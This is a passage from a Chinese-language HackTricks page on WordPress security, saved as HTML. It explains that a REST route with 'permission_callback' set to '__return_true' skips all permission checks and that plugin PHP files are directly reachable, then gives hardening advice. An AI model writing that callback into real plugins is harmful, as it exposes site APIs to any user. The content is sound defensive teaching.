'permission_callback' =&gt; '__return_true'
)
);
</code></pre>
<p><code>permission_callback</code> 是一个回调函数，用于检查给定用户是否有权调用 API 方法。</p>
<p><strong>如果使用内置的 <code>__return_true</code> 函数，它将简单地跳过用户权限检查。</strong></p>
<ul>
<li><strong>直接访问 php 文件</strong></li>
</ul>
<p>当然，Wordpress 使用 PHP，插件中的文件可以直接从网络访问。因此，如果一个插件暴露了任何通过访问文件触发的脆弱功能，任何用户都可以利用它。</p>
<h2 id="wordpress-保护"><a class="header" href="#wordpress-保护">WordPress 保护</a></h2>
<h3 id="定期更新"><a class="header" href="#定期更新">定期更新</a></h3>
<p>确保 WordPress、插件和主题是最新的。还要确认在 wp-config.php 中启用了自动更新：</p>
<pre><code class="language-bash">define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
</code></pre>
<p>也<strong>只安装可信的 WordPress 插件和主题</strong>。</p>
<h3 id="安全插件"><a class="header" href="#安全插件">安全插件</a></h3>
<ul>
<li><a href="https://wordpress.org/plugins/wordfence/"><strong>Wordfence Security</strong></a></li>
<li><a href="https://wordpress.org/plugins/sucuri-scanner/"><strong>Sucuri Security</strong></a></li>
<li><a href="https://wordpress.org/plugins/better-wp-security/"><strong>iThemes Security</strong></a></li>
</ul>
<h3 id="其他建议"><a class="header" href="#其他建议"><strong>其他建议</strong></a></h3>
<ul>
<li>删除默认的 <strong>admin</strong> 用户</li>
<li>使用 <strong>强密码</strong> 和 <strong>双因素认证</strong></li>
<li>定期 <strong>审查</strong> 用户 <strong>权限</strong></li>
<li><strong>限制登录尝试</strong> 以防止暴力破解攻击</li>
<li>重命名 <strong><code>wp-admin.php</code></strong> 文件，并仅允许内部或特定 IP 地址访问。</li>
</ul>
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
使用 <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_term=trickest&amp;utm_content=wordpress"><strong>Trickest</strong></a> 轻松构建和 <strong>自动化工作流程</strong>，由世界上 <strong>最先进</strong> 的社区工具提供支持。<br />
今天就获取访问权限：</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=wordpress" %}</p>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../network-services-pentesting/pentesting-web/werkzeug.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../network-services-pentesting/pentesting-kerberos-88/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../network-services-pentesting/pentesting-web/werkzeug.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../network-services-pentesting/pentesting-kerberos-88/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
